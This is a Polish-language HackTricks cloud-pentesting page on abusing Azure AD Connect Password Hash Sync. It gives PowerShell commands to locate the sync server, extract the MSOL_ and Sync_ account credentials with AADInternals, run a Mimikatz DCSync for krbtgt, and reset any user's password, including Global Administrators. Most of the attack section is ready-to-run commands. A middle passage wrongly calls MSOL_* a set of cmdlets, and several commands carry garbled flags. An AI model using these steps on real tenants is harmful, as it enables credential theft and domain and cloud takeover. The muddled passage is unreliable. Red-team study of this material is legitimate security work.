# Az - PHS - Synchronizacja hasła

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Synchronizacja hasła** jest jedną z metod logowania używaną do osiągnięcia hybrydowej tożsamości. **Azure AD Connect** synchronizuje skrót skrótu hasła użytkownika z lokalnej instancji Active Directory do chmurowej instancji Azure AD.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To jest **najczęstsza metoda** używana przez firmy do synchronizacji lokalnej AD z Azure AD.

Wszyscy **użytkownicy** i **skrót skrótów hasła** są synchronizowani z lokalnej instancji do Azure AD. Jednak **hasła w postaci tekstu jawnego** lub **oryginalne skróty** nie są wysyłane do Azure AD.\
Ponadto, **wbudowane** grupy zabezpieczeń (takie jak administratorzy domeny...) nie są synchronizowane z Azure AD.

Synchronizacja **skrótów** odbywa się co **2 minuty**. Jednak domyślnie **wygaśnięcie hasła** i **wygaśnięcie konta** nie są synchronizowane w Azure AD. Dlatego użytkownik, którego **hasło lokalne wygasło** (niezmienione), może nadal **uzyskiwać dostęp do zasobów Azure** za pomocą starego hasła.

Kiedy użytkownik lokalny chce uzyskać dostęp do zasobu Azure, **uwierzytelnienie odbywa się w Azure AD**.

**PHS** jest wymagane dla funkcji takich jak **Ochrona tożsamości** i Usługi domen AAD.

## Pivoting

Po skonfigurowaniu PHS automatycznie tworzone są niektóre **konta uprzywilejowane**:

* Konto **`MSOL_<installationID>`** jest automatycznie tworzone w lokalnej AD. Temu kontu przypisywana jest rola **Konta synchronizacji katalogu** (patrz [dokumentacja](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)), co oznacza, że ma **uprawnienia replikacji (DCSync) w lokalnej AD**.
* Konto **`Sync_<nazwa serwera Azure ADConnect w lokalnej AD>_installationID`** jest tworzone w Azure AD. To konto może **resetować hasło DOWOLNEGO użytkownika** (synchronizowanego lub tylko w chmurze) w Azure AD.

Hasła dwóch wcześniej wymienionych kont uprzywilejowanych są **przechowywane w serwerze SQL** na serwerze, na którym zainstalowany jest **Azure AD Connect**. Administratorzy mogą wyodrębnić hasła tych uprzywilejowanych użytkowników w postaci tekstu jawnego.\
Baza danych znajduje się w `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Możliwe jest wyodrębnienie konfiguracji z jednej z tabel, z których jedna jest zaszyfrowana:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Zaszyfrowana konfiguracja** jest zaszyfrowana za pomocą **DPAPI** i zawiera hasła użytkownika `MSOL_*` w lokalnej AD oraz hasło **Sync\_\*** w AzureAD. Dlatego kompromitując te dane, możliwe jest podniesienie uprawnień do AD i AzureAD.

Można znaleźć [pełny przegląd tego, jak te poświadczenia są przechowywane i odszyfrowywane w tej prezentacji](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Znajdowanie **serwera Azure AD Connect**

Jeśli **serwer, na którym zainstalowany jest Azure AD Connect**, jest dołączony do domeny (zalecane w dokumentacji), można go znaleźć za pomocą:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Wykorzystywanie MSOL\_\*

MSOL\_\* to zestaw poleceń PowerShell dostępnych w module MSOnline, który jest częścią narzędzia Azure AD Connect. Te polecenia są używane do zarządzania usługą Azure Active Directory (Azure AD). Jednakże, niektóre z tych poleceń mogą być wykorzystane w celu uzyskania nieautoryzowanego dostępu lub przeprowadzenia ataku lateralnego w środowisku hybrydowym Azure AD Connect.

#### PHS (Password Hash Sync)

PHS (Password Hash Sync) to funkcja w Azure AD Connect, która synchronizuje skróty haseł użytkowników z lokalnej infrastruktury Active Directory do Azure AD. Ta funkcja jest używana do umożliwienia użytkownikom logowania się do usług w chmurze przy użyciu tych samych haseł, które używają do logowania się do lokalnych zasobów.

Atakujący może wykorzystać PHS do uzyskania skrótów haseł użytkowników z Azure AD i następnie przeprowadzić atak offline w celu złamania tych haseł. Jeśli atakujący uzyska dostęp do skrótów haseł, może to prowadzić do naruszenia poufności i bezpieczeństwa danych użytkowników.

#### Zabezpieczenia

Aby zabezpieczyć się przed nadużyciem MSOL\_\* i atakami na PHS, zaleca się podjęcie następujących działań:

1. Regularnie aktualizuj Azure AD Connect do najnowszej wersji, aby korzystać z najnowszych zabezpieczeń.
2. Upewnij się, że masz silne hasło dla konta usługi Azure AD Connect.
3. Ogranicz dostęp do konta usługi Azure AD Connect tylko do niezbędnych użytkowników.
4. Monitoruj logi zdarzeń Azure AD Connect w celu wykrywania podejrzanej aktywności.
5. Włącz monitorowanie i alarmowanie w przypadku podejrzanej aktywności związanej z PHS.

Przestrzeganie tych zaleceń pomoże w zabezpieczeniu środowiska hybrydowego Azure AD Connect przed nadużyciem MSOL\_\* i atakami na PHS.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Możesz również użyć [**adconnectdump**](https://github.com/dirkjanm/adconnectdump), aby uzyskać te poświadczenia.
{% endhint %}

### Nadużywanie Sync\_\*

Kompromitując konto **`Sync_*`**, możliwe jest **zresetowanie hasła** dowolnego użytkownika (w tym Globalnych Administratorów)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Jest również możliwe **zmodyfikowanie haseł tylko dla użytkowników chmury** (nawet jeśli jest to nieoczekiwane)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Możliwe jest również wykradnięcie hasła tego użytkownika.

{% hint style="danger" %}
Inną opcją jest **przydzielenie uprzywilejowanych uprawnień dla usługi głównej**, które użytkownik **Sync** ma **uprawnienia** do wykonania, a następnie **uzyskanie dostępu do tej usługi głównej** jako metody eskalacji uprawnień.
{% endhint %}

### Bezproblemowe SSO

Możliwe jest użycie Bezproblemowego SSO z PHS, co jest podatne na inne nadużycia. Sprawdź to w:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Odwołania

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
